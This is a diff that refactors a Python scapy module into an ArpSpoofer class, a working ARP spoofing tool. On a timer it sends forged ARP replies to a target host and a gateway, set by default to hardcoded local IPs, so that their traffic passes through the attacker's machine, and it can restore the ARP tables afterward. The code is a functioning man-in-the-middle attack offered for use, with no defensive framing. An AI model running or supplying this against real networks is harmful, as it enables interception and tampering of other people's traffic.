@@ -1,23 +1,19 @@
+'''
+Arp spoofing module. Stateless functions that can be used whenever + Stateful class that provides a simple interface
+'''
 import scapy.all as scapy
 import threading
 
-# Handles arp spoofing. Start, stop.
-default_target_ip = '192.168.8.137'
-default_host_ip = '192.168.8.243'
-running = False
 
-target_ip = default_target_ip
-host_ip = default_host_ip
-
-
-def get_mac1(ip):
+def get_mac1(ip: str):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/ arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
     return answered_list[0][1].hwsrc
 
-def get_mac(ip):
+
+def get_mac(ip: str):
     '''
     return MAC address of any device connected to the network
     If ip is down return None
@@ -30,21 +26,18 @@ def get_mac(ip):
         return answered_list[0][1].src
 
 
-def spoof(target_ip, spoof_ip, verbose=False):
+def spoof(target_ip: str, spoof_ip: str, verbose=False):
     '''
     Spoofs 'target_ip' saying that we are host_ip
     '''
-
     packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
-    # saved_packets.append(packet.summary())
-    # print("PACKET PACKET YUP\n\n")
-    # packet.show()
-    # print("\n\nPACKET PACKET YUP")
     scapy.send(packet, verbose = False)
     if verbose:
         #get the MAC address of the default interface we are using
+        packet.show()
         self_mac = scapy.ARP().hwsrc  
         # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))
+
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -55,48 +48,75 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose = False)
 
 
+class ArpSpoofer:
 
-def start(target = default_target_ip, host = default_host_ip, verbose = False):
-    # Stop printing so much
-    if not verbose:
-        scapy.conf.verb = 0
-    
-    print("Starting ARP Spoof")
+    def __init__(self, target_ip='192.168.8.137', host_ip='192.168.8.243', verbose=False, interval=1.0):
+        self.target_ip = target_ip
+        self.host_ip = host_ip
+        self.verbose = verbose
+        self.interval = interval
 
-    global running
-    running = True
-    
-    #victom ip address
-    target_ip = target
+        self.running = False
+        self.timer = None
 
-    #gateway ip
-    host_ip = host
 
-    def interval():
-        if running:
-            #Telling the target that we are the host
-            spoof(target_ip, host_ip, verbose)
+    def tick(self):
+        if not self.running:
+            return
 
-            # Telling the host that we are the target
-            spoof(host_ip, target_ip, verbose)
+        #Telling the target that we are the host
+        spoof(self.target_ip, self.host_ip, self.verbose)
 
-            # rerun in a second
-            timer = threading.Timer(1.0, interval)
-            timer.start()
-    interval()
-            
-def stop():
-    global running
+        # Telling the host that we are the target
+        spoof(self.host_ip, self.target_ip, self.verbose)
 
-    if running == False:
-        print("ARP spoof is not running")
-        return
+        # rerun in a second
+        self.timer = threading.Timer(self.interval, self.tick)
+        self.timer.start()
 
-    print("Stopping ARP spoof...")
 
-    running = False
+    def start(self, verbose=None):
+        if verbose is not None:
+            self.verbose = verbose
 
-    restore(target_ip, host_ip)
-    restore(host_ip, target_ip)
+        if not self.verbose:
+            scapy.conf.verb = 0
+        
+        if self.running:
+            print("ARP Spoof is already running")
+            return
+        
+        print("Starting ARP Spoof")
 
-    print("Stopped ARP Spoof")
+        self.running = True
+
+        self.tick()
+
+                
+    def stop(self):
+
+        if self.running == False:
+            print("ARP spoof is not running")
+            return
+
+        print("Stopping ARP spoof...")
+
+        self.running = False
+
+        if self.timer:
+            self.timer.cancel()
+
+        restore(self.target_ip, self.host_ip)
+        restore(self.host_ip, self.target_ip)
+
+        print("Stopped ARP Spoof")
+
+
+if __name__ == "__main__":
+    spoofer = ArpSpoofer()
+
+    spoofer.start(verbose=True)
+
+    input("Press Enter to stop")
+
+    spoofer.stop()
